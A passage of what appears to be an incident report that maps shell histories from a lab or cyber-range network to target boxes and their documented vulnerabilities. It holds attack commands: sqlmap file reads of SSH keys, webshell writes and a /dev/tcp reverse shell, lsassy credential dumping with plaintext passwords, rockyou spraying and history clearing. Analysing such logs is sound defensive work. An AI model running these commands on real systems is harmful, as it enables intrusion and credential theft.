  - 2026-01-20T19:50:03 | logs/10.100.7.22/shell_history.csv#L149 | curl https://10.100.7.40:80
  - 2026-01-20T19:50:16 | logs/10.100.7.22/shell_history.csv#L150 | curl https://10.100.7.40:80/

## Incident 784 - 2026-01-27T18:55:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T18:55:51 | logs/10.100.7.22/shell_history.csv#L176 | cd ~
  - 2026-01-27T18:55:52 | logs/10.100.7.22/shell_history.csv#L177 | ls

## Incident 785 - 2026-01-08T19:19:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T19:19:00 | logs/10.100.7.23/shell_history.csv#L1 | exit
  - 2026-01-08T19:19:24 | logs/10.100.7.23/shell_history.csv#L2 | sudo bash
  - 2026-01-08T19:19:01 | logs/10.100.7.24/shell_history.csv#L1 | exit
  - 2026-01-08T19:19:03 | logs/10.100.7.24/shell_history.csv#L2 | exit
  - 2026-01-08T19:19:03 | logs/10.100.7.24/shell_history.csv#L3 | exit
  - 2026-01-08T19:19:04 | logs/10.100.7.24/shell_history.csv#L4 | ls
  - 2026-01-08T19:19:06 | logs/10.100.7.24/shell_history.csv#L5 | cat .full_research_history.csv
  - 2026-01-08T19:19:26 | logs/10.100.7.24/shell_history.csv#L6 | sudo bash

## Incident 786 - 2026-01-13T20:37:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T20:37:10 | logs/10.100.7.23/shell_history.csv#L3 | exit
  - 2026-01-13T20:37:12 | logs/10.100.7.23/shell_history.csv#L4 | history
  - 2026-01-13T20:37:18 | logs/10.100.7.23/shell_history.csv#L5 | systemctl restart xrdp

## Incident 787 - 2026-01-26T19:10:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:10:29 | logs/10.100.7.24/shell_history.csv#L122 | ls
  - 2026-01-26T19:10:36 | logs/10.100.7.24/shell_history.csv#L123 | vim readme.txt
  - 2026-01-26T19:10:44 | logs/10.100.7.24/shell_history.csv#L124 | vim maintenance.log

## Incident 788 - 2026-01-26T19:19:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:19:09 | logs/10.100.7.24/shell_history.csv#L139 | vim maintenance.ps1
  - 2026-01-26T19:19:30 | logs/10.100.7.24/shell_history.csv#L141 | mv maintenance.ps1 maintenance2.ps1
  - 2026-01-26T19:19:35 | logs/10.100.7.24/shell_history.csv#L142 | rm maintenance.ps1
  - 2026-01-26T19:19:41 | logs/10.100.7.24/shell_history.csv#L143 | ls

## Incident 789 - 2026-01-26T19:21:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:21:08 | logs/10.100.7.24/shell_history.csv#L145 | exit
  - 2026-01-26T19:21:02 | logs/10.100.7.31/shell_history.csv#L8 | ifconfig

## Incident 790 - 2026-01-27T18:51:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T18:51:28 | logs/10.100.7.24/shell_history.csv#L231 | smbclient //10.100.7.46/ADMIN$ -U “”
  - 2026-01-27T18:51:39 | logs/10.100.7.24/shell_history.csv#L232 | smbclient -L //10.100.7.46 -U “”
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 791 - 2026-01-27T20:26:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T20:26:43 | logs/10.100.7.24/shell_history.csv#L294 | nxc smb 10.100.7.46 -u Administrator -p aXn6sYPwievyoDeQvYX1 -M lsassy
  - 2026-01-27T20:26:54 | logs/10.100.7.24/shell_history.csv#L295 | nxc smb 10.100.7.46 -u Administrator -p aXn6sYPwievyoDeQvYX1 -M lsassy
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 792 - 2026-01-27T20:27:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T20:27:28 | logs/10.100.7.24/shell_history.csv#L296 | nxc smb 10.100.7.46 -u Administrator -p aXn6sYPwievyoDeQvYX1 -M lsassy
  - 2026-01-27T20:27:28 | logs/10.100.7.24/shell_history.csv#L297 | nxc smb 10.100.7.46 -u Administrator -p aXn6sYPwievyoDeQvYX1 -M lsassy
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 793 - 2026-01-08T19:35:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T19:35:37 | logs/10.100.7.12/shell_history.csv#L1 | exit
  - 2026-01-08T19:35:37 | logs/10.100.7.12/shell_history.csv#L2 | ls
  - 2026-01-08T19:35:50 | logs/10.100.7.12/shell_history.csv#L3 | cat .full_research_history.csv

## Incident 794 - 2026-01-08T19:36:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T19:36:10 | logs/10.100.7.12/shell_history.csv#L4 | sudo bash
  - 2026-01-08T19:36:18 | logs/10.100.7.12/shell_history.csv#L5 | exit
  - 2026-01-08T19:36:28 | logs/10.100.7.12/shell_history.csv#L6 | sudo bash

## Incident 795 - 2026-01-27T20:11:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T20:11:08 | logs/10.100.7.12/shell_history.csv#L54 | nxc smb  10.100.7.46 -u EMBER$ -p J4f9juEr --shares
  - 2026-01-27T20:11:49 | logs/10.100.7.12/shell_history.csv#L55 | nxc smb  10.100.7.46 -u rand3 -p password123 --shares
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 796 - 2026-01-27T20:25:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T20:25:33 | logs/10.100.7.12/shell_history.csv#L64 | ~sqlmap -u 10.100.7.45/panels.php?id=1" -D pyrewatch --tables"
  - 2026-01-27T20:25:56 | logs/10.100.7.12/shell_history.csv#L65 | sqlmap -u 10.100.7.45/panels.php?id=1" -D pyrewatch --tables"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 797 - 2026-02-02T18:02:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T18:02:06 | logs/10.100.7.12/shell_history.csv#L70 | sqlmap -u 10.100.7.45/panels.php?id=1" -D information_schema -T USER_PRIVILEGES --columns"
  - 2026-02-02T18:02:18 | logs/10.100.7.12/shell_history.csv#L71 | ping 10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 798 - 2026-02-02T18:04:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:04:05 | logs/10.100.7.12/shell_history.csv#L74 | tldr --update
  - 2026-02-02T18:04:08 | logs/10.100.7.12/shell_history.csv#L75 | tldr sqlmap

## Incident 799 - 2026-02-02T18:16:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:16:11 | logs/10.100.7.12/shell_history.csv#L80 | ps aux
  - 2026-02-02T18:16:18 | logs/10.100.7.12/shell_history.csv#L81 | ps aux | grep fox
  - 2026-02-02T18:16:29 | logs/10.100.7.12/shell_history.csv#L82 | ps kill fox
  - 2026-02-02T18:16:36 | logs/10.100.7.12/shell_history.csv#L83 | pkill fox
  - 2026-02-02T18:16:58 | logs/10.100.7.12/shell_history.csv#L84 | ps -aef --forest

## Incident 800 - 2026-02-02T18:17:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:17:21 | logs/10.100.7.12/shell_history.csv#L85 | whoami
  - 2026-02-02T18:17:51 | logs/10.100.7.12/shell_history.csv#L86 | w -i

## Incident 801 - 2026-02-02T18:18:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:18:41 | logs/10.100.7.12/shell_history.csv#L88 | w -i
  - 2026-02-02T18:18:52 | logs/10.100.7.12/shell_history.csv#L89 | tldr sqlmap

## Incident 802 - 2026-02-02T18:19:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:19:49 | logs/10.100.7.12/shell_history.csv#L90 | ls
  - 2026-02-02T18:19:56 | logs/10.100.7.12/shell_history.csv#L91 | cd Desktop
  - 2026-02-02T18:19:59 | logs/10.100.7.12/shell_history.csv#L92 | cd ../

## Incident 803 - 2026-02-02T18:20:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:20:08 | logs/10.100.7.12/shell_history.csv#L93 | cd ~/
  - 2026-02-02T18:20:14 | logs/10.100.7.12/shell_history.csv#L94 | cd Desktop
  - 2026-02-02T18:20:15 | logs/10.100.7.12/shell_history.csv#L95 | ls
  - 2026-02-02T18:20:17 | logs/10.100.7.12/shell_history.csv#L96 | cd ~
  - 2026-02-02T18:20:21 | logs/10.100.7.12/shell_history.csv#L97 | cd Public
  - 2026-02-02T18:20:22 | logs/10.100.7.12/shell_history.csv#L98 | ls
  - 2026-02-02T18:20:24 | logs/10.100.7.12/shell_history.csv#L99 | cd ~
  - 2026-02-02T18:20:26 | logs/10.100.7.12/shell_history.csv#L100 | ls
  - 2026-02-02T18:20:32 | logs/10.100.7.12/shell_history.csv#L101 | cd Documents
  - 2026-02-02T18:20:32 | logs/10.100.7.12/shell_history.csv#L102 | ls
  - 2026-02-02T18:20:38 | logs/10.100.7.12/shell_history.csv#L103 | cd ~
  - 2026-02-02T18:20:46 | logs/10.100.7.12/shell_history.csv#L104 | cd Downloads
  - 2026-02-02T18:20:46 | logs/10.100.7.12/shell_history.csv#L105 | ls
  - 2026-02-02T18:20:49 | logs/10.100.7.12/shell_history.csv#L106 | cd ~

## Incident 804 - 2026-02-02T18:21:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:21:43 | logs/10.100.7.12/shell_history.csv#L107 | cd Templates
  - 2026-02-02T18:21:44 | logs/10.100.7.12/shell_history.csv#L108 | ls
  - 2026-02-02T18:21:48 | logs/10.100.7.12/shell_history.csv#L109 | cd ~

## Incident 805 - 2026-02-02T18:22:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:22:02 | logs/10.100.7.12/shell_history.csv#L110 | cd thinkclient_drives
  - 2026-02-02T18:22:04 | logs/10.100.7.12/shell_history.csv#L111 | ls
  - 2026-02-02T18:22:12 | logs/10.100.7.12/shell_history.csv#L112 | cd thinclient_drives
  - 2026-02-02T18:22:13 | logs/10.100.7.12/shell_history.csv#L113 | ls
  - 2026-02-02T18:22:16 | logs/10.100.7.12/shell_history.csv#L114 | cd ~
  - 2026-02-02T18:22:33 | logs/10.100.7.12/shell_history.csv#L115 | clear
  - 2026-02-02T18:22:35 | logs/10.100.7.12/shell_history.csv#L116 | history
  - 2026-02-02T18:22:37 | logs/10.100.7.12/shell_history.csv#L117 | clear history
  - 2026-02-02T18:22:44 | logs/10.100.7.12/shell_history.csv#L118 | clear -T history
  - 2026-02-02T18:22:50 | logs/10.100.7.12/shell_history.csv#L119 | tldr history

## Incident 806 - 2026-02-02T18:23:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:23:09 | logs/10.100.7.12/shell_history.csv#L120 | history -c
  - 2026-02-02T18:23:15 | logs/10.100.7.12/shell_history.csv#L121 | history -c
  - 2026-02-02T18:23:16 | logs/10.100.7.12/shell_history.csv#L122 | history
  - 2026-02-02T18:23:25 | logs/10.100.7.12/shell_history.csv#L123 | history -d

## Incident 807 - 2026-02-02T18:24:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:24:11 | logs/10.100.7.12/shell_history.csv#L124 | clear
  - 2026-02-02T18:24:14 | logs/10.100.7.12/shell_history.csv#L125 | history -clear
  - 2026-02-02T18:24:54 | logs/10.100.7.12/shell_history.csv#L126 | history -d
  - 2026-02-02T18:24:55 | logs/10.100.7.12/shell_history.csv#L127 | history -d
  - 2026-02-02T18:24:57 | logs/10.100.7.12/shell_history.csv#L128 | clear

## Incident 808 - 2026-02-02T18:57:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:57:24 | logs/10.100.7.12/shell_history.csv#L159 | history
  - 2026-02-02T18:57:30 | logs/10.100.7.12/shell_history.csv#L160 | history

## Incident 809 - 2026-02-02T19:56:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:56:00 | logs/10.100.7.12/shell_history.csv#L210 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/home/user/.ssh/id_rsa"
  - 2026-02-02T19:56:21 | logs/10.100.7.12/shell_history.csv#L211 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write=id_rsa --file-dest=/home/user/.ssh/id_rsa"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 810 - 2026-02-03T19:13:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:13:42 | logs/10.100.7.12/shell_history.csv#L235 | sqlmap -u 10.100.7.45/panels.php?id=1" --current-user --privileges"
  - 2026-02-03T19:13:53 | logs/10.100.7.12/shell_history.csv#L236 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read="/home/pyre/ctrl.txt""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 811 - 2026-02-03T19:37:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:37:15 | logs/10.100.7.12/shell_history.csv#L256 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="shell.py" --file-dest="~/var/www/html""
  - 2026-02-03T19:37:25 | logs/10.100.7.12/shell_history.csv#L257 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="shell.py" --file-dest="~/var/www/html/shell.py""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 812 - 2026-02-03T19:39:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:39:39 | logs/10.100.7.12/shell_history.csv#L260 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:39:52 | logs/10.100.7.12/shell_history.csv#L261 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="shell.py" --file-dest="/var/www/html/shell.py""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 813 - 2026-02-03T19:40:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-02-03T19:40:07 | logs/10.100.7.31/shell_history.csv#L90 | nxc smb 10.100.7.46 -u guest -p ‘ ‘
  - 2026-02-03T19:40:22 | logs/10.100.7.31/shell_history.csv#L91 | nxc smb 10.100.7.46 -u guest -p ‘ ‘
  - 2026-02-03T19:40:36 | logs/10.100.7.31/shell_history.csv#L92 | nxc smb 10.100.7.46 -u guest -p ‘ ‘ --shares
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 814 - 2026-02-03T19:49:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:49:09 | logs/10.100.7.12/shell_history.csv#L273 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:49:42 | logs/10.100.7.12/shell_history.csv#L274 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 815 - 2026-02-03T19:52:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:52:12 | logs/10.100.7.12/shell_history.csv#L276 | ipconfig
  - 2026-02-03T19:52:16 | logs/10.100.7.12/shell_history.csv#L277 | ipaddress

## Incident 816 - 2026-02-03T19:52:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:52:36 | logs/10.100.7.12/shell_history.csv#L278 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:52:46 | logs/10.100.7.12/shell_history.csv#L279 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-command="whoami""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 817 - 2026-02-03T19:53:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:53:12 | logs/10.100.7.12/shell_history.csv#L280 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-cmd="whoami""
  - 2026-02-03T19:53:23 | logs/10.100.7.12/shell_history.csv#L281 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-cmd="sh -i >& /dev/tcp/10.100.7.12/10000 0>&1""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 818 - 2026-02-03T19:57:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:57:27 | logs/10.100.7.12/shell_history.csv#L285 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=~/.ssh/authorized_keys"
  - 2026-02-03T19:57:42 | logs/10.100.7.12/shell_history.csv#L286 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=~/.ssh/authorized_keys"
  - 2026-02-03T19:57:58 | logs/10.100.7.12/shell_history.csv#L287 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 819 - 2026-02-03T20:00:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T20:00:18 | logs/10.100.7.12/shell_history.csv#L288 | history
  - 2026-02-03T20:00:21 | logs/10.100.7.12/shell_history.csv#L289 | history

## Incident 820 - 2026-02-09T18:32:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-09T18:32:11 | logs/10.100.7.12/shell_history.csv#L308 | nano maintenance.ps1
  - 2026-02-09T18:32:13 | logs/10.100.7.12/shell_history.csv#L309 | cat maintenance.ps1

## Incident 821 - 2026-02-09T18:39:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-02-09T18:39:17 | logs/10.100.7.12/shell_history.csv#L310 | smbclient //10.100.7.46/Scripts --user Ember
  - 2026-02-09T18:39:32 | logs/10.100.7.12/shell_history.csv#L311 | smbclient //10.100.7.46/Scripts --user Ember
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 822 - 2026-02-09T18:44:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-02-09T18:44:27 | logs/10.100.7.12/shell_history.csv#L315 | smbclient //10.100.7.46/Scripts --user Ember
  - 2026-02-09T18:44:34 | logs/10.100.7.12/shell_history.csv#L316 | smbclient //10.100.7.46/Scripts --user Ember
  - 2026-02-09T18:44:44 | logs/10.100.7.12/shell_history.csv#L317 | smbclient //10.100.7.46/Scripts --user Ember
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 823 - 2026-02-09T19:41:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-09T19:41:26 | logs/10.100.7.12/shell_history.csv#L328 | mysql -h 10.100.7.48
  - 2026-02-09T19:41:39 | logs/10.100.7.12/shell_history.csv#L329 | mysql -u root -h 10.100.7.48 -p
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 824 - 2026-02-09T19:42:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-09T19:42:01 | logs/10.100.7.12/shell_history.csv#L330 | mysql -u root -h 10.100.7.48
  - 2026-02-09T19:42:37 | logs/10.100.7.12/shell_history.csv#L331 | mysql -u root -h 10.100.7.48 --skip-password
  - 2026-02-09T19:42:54 | logs/10.100.7.12/shell_history.csv#L332 | mysql -u inspire -h 10.100.7.48 --skip-password
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 825 - 2026-02-09T19:49:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-09T19:49:03 | logs/10.100.7.12/shell_history.csv#L335 | mysql -u inspire -h 10.100.7.48 -p --skip-ssl
  - 2026-02-09T19:49:29 | logs/10.100.7.12/shell_history.csv#L336 | mysql -u inspire -h 10.100.7.48 -p --skip-ssl
  - 2026-02-09T19:49:56 | logs/10.100.7.12/shell_history.csv#L337 | mysql -u inspire -h 10.100.7.48 -p --skip-ssl
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 826 - 2026-02-10T20:08:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T20:08:09 | logs/10.100.7.31/shell_history.csv#L94 | nxc smb 10.100.7.42 -u orbital -p ‘123‘ --shares
  - 2026-02-10T20:08:31 | logs/10.100.7.31/shell_history.csv#L95 | nxc smb 10.100.7.42 -u orbital -p 123 --shares
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 827 - 2026-02-03T19:08:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-02-03T19:08:14 | logs/10.100.7.31/shell_history.csv#L36 | smbclient //10.100.7.40/share --user solaris
  - 2026-02-03T19:08:21 | logs/10.100.7.31/shell_history.csv#L37 | smbclient //10.100.7.40/share --user guest

## Incident 828 - 2026-02-03T19:09:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-03T19:09:21 | logs/10.100.7.31/shell_history.csv#L40 | nmap 10.100.7.42 -p 21
  - 2026-02-03T19:09:45 | logs/10.100.7.31/shell_history.csv#L44 | nmap 10.100.7.42 -p 445
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 829 - 2026-02-03T19:09:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:09:28 | logs/10.100.7.31/shell_history.csv#L41 | nmap 10.100.7.45 -p 21
  - 2026-02-03T19:09:35 | logs/10.100.7.31/shell_history.csv#L42 | nmap 10.100.7.45 -p 45
  - 2026-02-03T19:09:38 | logs/10.100.7.31/shell_history.csv#L43 | nmap 10.100.7.45 -p 445
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 830 - 2026-02-03T19:17:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:17:46 | logs/10.100.7.31/shell_history.csv#L49 | sudo apt install gccgo-go
  - 2026-02-03T19:17:59 | logs/10.100.7.31/shell_history.csv#L50 | go install github.com/OJ/gobuster/v3@latest

## Incident 831 - 2026-02-03T19:26:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:26:02 | logs/10.100.7.31/shell_history.csv#L70 | cd dirbuster
  - 2026-02-03T19:26:03 | logs/10.100.7.31/shell_history.csv#L71 | ls

## Incident 832 - 2026-02-03T19:35:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-02-03T19:35:05 | logs/10.100.7.31/shell_history.csv#L86 | gobuster dir -u http://10.100.7.46 -w directory-list-lowercase-2.3-medium.txt
  - 2026-02-03T19:35:47 | logs/10.100.7.31/shell_history.csv#L87 | gobuster dir -u http://10.100.7.46 -w directory-list-2.3-medium.txt
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 833 - 2026-02-10T20:13:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T20:13:03 | logs/10.100.7.31/shell_history.csv#L97 | nxc smb 10.100.7.42 -u orbital -p 123
  - 2026-02-10T20:13:43 | logs/10.100.7.31/shell_history.csv#L99 | ftp orbital@10.100.7.42
  - 2026-02-10T20:13:50 | logs/10.100.7.31/shell_history.csv#L101 | nxc smb 10.100.7.42 -u orbital -p 123
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 834 - 2026-02-10T20:13:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T20:13:04 | logs/10.100.7.31/shell_history.csv#L98 | clear
  - 2026-02-10T20:13:45 | logs/10.100.7.31/shell_history.csv#L100 | clear

## Incident 835 - 2026-02-10T20:15:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T20:15:22 | logs/10.100.7.31/shell_history.csv#L104 | pip install impacket
  - 2026-02-10T20:15:28 | logs/10.100.7.31/shell_history.csv#L105 | apt install tealdeer
  - 2026-02-10T20:15:43 | logs/10.100.7.31/shell_history.csv#L106 | sudo apt install tealdeer
  - 2026-02-10T20:15:48 | logs/10.100.7.31/shell_history.csv#L107 | sudo apt install impacket
  - 2026-02-10T20:15:53 | logs/10.100.7.31/shell_history.csv#L108 | tldr smbclient

## Incident 836 - 2026-02-10T20:16:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T20:16:34 | logs/10.100.7.31/shell_history.csv#L109 | smbclient superuser:'123'@10.100.7.42
  - 2026-02-10T20:16:45 | logs/10.100.7.31/shell_history.csv#L110 | smbclient.py superuser:'123'@10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 837 - 2026-02-10T20:17:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T20:17:33 | logs/10.100.7.31/shell_history.csv#L112 | smbclient //server/share --user orbital
  - 2026-02-10T20:17:47 | logs/10.100.7.31/shell_history.csv#L113 | smbclient //server/share --user orbital -p 123
  - 2026-02-10T20:17:49 | logs/10.100.7.31/shell_history.csv#L114 | clear

## Incident 838 - 2026-02-10T20:18:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T20:18:22 | logs/10.100.7.31/shell_history.csv#L115 | nxc smb 10.100.7.42
  - 2026-02-10T20:18:47 | logs/10.100.7.31/shell_history.csv#L116 | nxc smb 10.100.7.42 -u Administrator -p password.txt
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 839 - 2026-02-10T20:19:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T20:19:45 | logs/10.100.7.31/shell_history.csv#L117 | nxc smb 10.100.7.42 -u Administrator -p rockyou.txt.gz
  - 2026-02-10T20:19:50 | logs/10.100.7.31/shell_history.csv#L118 | nxc smb 10.100.7.42 -u Administrator -p rockyou.txt
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

